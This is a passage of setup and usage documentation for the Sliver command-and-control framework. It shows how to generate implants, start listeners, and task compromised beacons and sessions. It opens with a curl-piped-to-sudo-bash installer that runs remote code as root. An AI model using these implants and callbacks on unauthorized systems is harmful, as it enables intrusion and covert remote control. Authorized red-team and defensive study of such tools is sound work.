For a Linux server, you can also use the one liner installation `curl https://sliver.sh/install|sudo bash`
```asciinema
{"src": "/asciinema/install-1.cast", "cols": "132"}
```

If you install Sliver via the one liner, you can check that the server service is running using `systemctl status sliver`. Note that the Sliver service is not configured to start automatically on boot by default (i.e., if you reboot the server you'll need to start the service again using `systemctl start sliver`):
```asciinema
{"src": "/asciinema/service-status-1.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

#### System Requirements
### MinGW Setup (Optional, Recommended)
#### Linux (Debian-based)

```
apt install git mingw-w64
```

#### MacOS

```
brew install git mingw-w64
```

### Metasploit Setup (Optional)
## Implants: Beacon vs. Session
## Generating Implants
#### Session Mode

```asciinema
{"src": "/asciinema/sliver-generate-1.cast", "cols": "132"}
```

#### Beacon Mode

```asciinema
{"src": "/asciinema/sliver-generate-2.cast", "cols": "132"}
```

Some commands/features may not work on "unsupported" platforms.
```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --os mac

[*] Generating new darwin/amd64 Sliver binary
[*] Build completed in 00:00:09
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
```

The server will also assign code names to each generated binary i.e. `NEW_GRAPE.exe` you can rename the file to anything you need to, but these code names will still uniquely identify the generated binary (they're inserted at compile-time). You can also view all previously generated implant binaries with the `implants` command:
```
sliver > implants

Name                    OS/Arch        Debug  Format
====                    =======        =====  ======
CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
SICK_SPY                darwin/amd64   false  EXECUTABLE
```

If you need to re-download a previously generated implant use the `regenerate` command, note that positional arguments (the implant name) comes after the command flags (e.g., `--save`):
```
sliver > regenerate --save /Users/moloch/Desktop NEW_GRAPE

[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

#### Additional Details
## Getting Shells
Before you can catch the shell, you'll first need to start a listener. You use the commands `mtls`, `http`, `https`, and `dns` to start listeners for each protocol (remember endpoints specified with `--http` can connect to a `https` listener). You can use the `jobs` command to view and manage listeners running in the background. Listeners support both sessions and beacons callbacks:
```
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   mTLS  tcp       8888
```

### Interacting with Sessions
The `use` command will tab-complete session and beacon identifiers, but you can also type them out if you really want to (identifier prefixes are accepted). Additionally, running the `use` command with no arguments will enter an interactive menu to select from.
```
[*] Session 8ff2ce4c LONG_DRAMATURGE - [::1]:57154 (MacBook-Pro-6.local) - darwin/amd64 - Thu, 20 Jan 2022 15:45:10 CST

sliver > use 8ff2ce4c

[*] Active session LONG_DRAMATURGE (8ff2ce4c-9c66-4cbc-b33c-2a56196536e6)

sliver (LONG_DRAMATURGE) > ls

/Users/moloch/Desktop
=====================
.DS_Store                 6.0 KiB
.localized                0 B
LONG_DRAMATURGE           6.3 MiB
```

### Interacting with Beacons
Upon initial execution the beacon will register itself with the C2 server and will show up under `beacons`, each instance of a beacon process will get its own id and this id is used for the lifetime of that process (i.e., across key renegotiation, etc). The "Next Check-in" value includes any random jitter (by default up to 30s), and you can also watch your beacons in real time using the `beacons watch` command. Remember to leverage tab complete for the uuid when using `use`:
```
[*] Beacon 8c465643 RELATIVE_ADVERTISEMENT - 192.168.1.178:54701 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:40:55 CST

[server] sliver > beacons

 ID         Name                     Tasks   Transport   Remote Address        Hostname          Username                        Operating System   Last Check-In    Next Check-In
========== ======================== ======= =========== ===================== ================= =============================== ================== ================ ===============
 8c465643   RELATIVE_ADVERTISEMENT   0/0     mtls        192.168.1.178:54701   WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      49.385459s ago   37.614549s

[server] sliver > use 8c465643-0e65-45f2-bb7e-acb3480de3cb

[*] Active beacon RELATIVE_ADVERTISEMENT (8c465643-0e65-45f2-bb7e-acb3480de3cb)

[server] sliver (RELATIVE_ADVERTISEMENT) >
```

You should see a blue prompt indicating that we're interacting with a beacon as apposed to a session (red). Commands are executed the same way as a session, though not all commands are supported in beacon mode.
```
[server] sliver (RELATIVE_ADVERTISEMENT) > ls

[*] Tasked beacon RELATIVE_ADVERTISEMENT (962978a6)

[+] RELATIVE_ADVERTISEMENT completed task 962978a6

C:\git
======
drwxrwxrwx  a                           <dir>     Wed Dec 22 15:34:56 -0600 2021
...
```

You can view previous tasks executed by the active beacon using the `tasks` command:
```
[server] sliver (RELATIVE_ADVERTISEMENT) > tasks

 ID         State       Message Type   Created                         Sent                            Completed
========== =========== ============== =============================== =============================== ===============================
 90294ad2   completed   Ls             Sat, 22 Jan 2022 14:45:00 CST   Sat, 22 Jan 2022 14:45:11 CST   Sat, 22 Jan 2022 14:45:11 CST
 962978a6   completed   Ls             Sat, 22 Jan 2022 14:42:43 CST   Sat, 22 Jan 2022 14:43:53 CST   Sat, 22 Jan 2022 14:43:53 CST
```

#### Switching from Beacon Mode to Session Mode
You can use the `interactive` command to task a beacon to open an interactive session, with no arguments the current C2 channel will be used:
```
[server] sliver (RELATIVE_ADVERTISEMENT) > interactive

[*] Using beacon's active C2 endpoint: mtls://192.168.1.150:8888
[*] Tasked beacon RELATIVE_ADVERTISEMENT (3920e899)

[*] Session 223fac7e RELATIVE_ADVERTISEMENT - 192.168.1.178:54733 (WIN-1TT1Q345B37) - windows/amd64 - Sat, 22 Jan 2022 14:55:24 CST
```

## Multiple Domains/Protocols
By default Sliver will attempt to use the `s` sequential connection strategy: the most performant protocols are used first (MTLS -> WG -> HTTP(S) -> DNS) falling back to subsequent domains/protocols if/when connections fail.
```
sliver > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
```

You can modify the connection strategy at compile-time using the `--strategy` flag. For example, you can instruct the implant to `r` randomly connect to any specified C2 endpoint:
```
sliver > generate --mtls foo.com,bar.com,baz.com --strategy r
```

